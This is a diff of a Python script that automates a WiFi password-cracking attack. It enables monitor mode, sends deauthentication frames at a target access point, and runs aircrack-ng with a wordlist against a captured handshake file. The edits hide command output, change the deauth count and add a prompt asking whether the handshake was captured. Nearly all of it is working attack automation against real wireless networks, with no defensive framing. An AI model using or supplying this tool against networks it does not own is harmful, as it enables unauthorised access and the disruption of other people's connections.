@@ -10,8 +10,11 @@ class Color:
     CYAN = '\033[96m'
     RED = '\033[91m'
 
-def execute_command(command):
-    subprocess.run(command, shell=True)
+def execute_command(command, show_output=True):
+    if show_output:
+        subprocess.run(command.split(), check=True)
+    else:
+        subprocess.run(command.split(), check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 # Customized banner with color
 def print_banner():
@@ -32,16 +35,14 @@ def print_banner():
 
 print_banner()
 
-
-
 # 1. airmon-ng check kill
-execute_command("airmon-ng check kill")
+execute_command("airmon-ng check kill", show_output=False)
 
 # 2. Wait for 2 seconds
 time.sleep(2)
 
 # 3. Enabling monitor mode
-execute_command("airmon-ng start wlan0")
+execute_command("airmon-ng start wlan0" , show_output=False)
 
 # 4. Wait for 2 seconds
 time.sleep(2)
@@ -68,20 +69,25 @@ input("Press Enter when you're done..." + Color.END)
 # 8. Wait for 2 seconds
 time.sleep(2)
 
-# 9. Print "Disconnect host from WiFi"
+# 9. Print "Disconnecting host from WiFi"
 print_banner()
-print(f"{Color.BOLD}{Color.CYAN}Disconnect host from WiFi{Color.END}")
+print(f"{Color.BOLD}{Color.CYAN}Disconnecting host from WiFi Network, Plesae wait Few Second...{Color.END}")
 
 # 10. Deauthenticating host from WiFi
-execute_command(f"aireplay-ng --deauth 10 -a {bssid} wlan0")
+execute_command(f"aireplay-ng --deauth 5 -a {bssid} wlan0" , show_output=False)
+print()
 
 # 11. Wait for 2 seconds
 time.sleep(2)
 
-# 12. Print "Giving the result"
-print_banner()
-print(f"{Color.BOLD}{Color.CYAN}Giving the result{Color.END}")
-wordlist = input(f"{Color.BOLD}Enter full path of wordlist (press Tab for autocomplete): {Color.END}")
+# ask user did hankshake file captured or not
 
-execute_command(f"aircrack-ng --bssid {bssid} wlan0 -w {wordlist} hand_shake*.cap")
+confirmation = input(f"{Color.BOLD} DID Handshake File of this {bssid} captured in other terminal or not : YES / NO : {Color.END}")
+if confirmation == "yes" :
+    print(f"{Color.BOLD}{Color.CYAN}Password cracking starts {Color.END}")
+    wordlist = input(f"{Color.BOLD}Enter full path of wordlist:  {Color.END}")
+    print("Wait... until password is cracked...")
+    execute_command(f"aircrack-ng --bssid {bssid} -w {wordlist} hand_shake-01.cap", show_output=True)
+else :
+    print(f"{Color.BOLD}{Color.CYAN} SORRY CAN'T MOVE FORWORD UNTIL HANDSHAKE FILE CAPTURED {Color.END}")
 
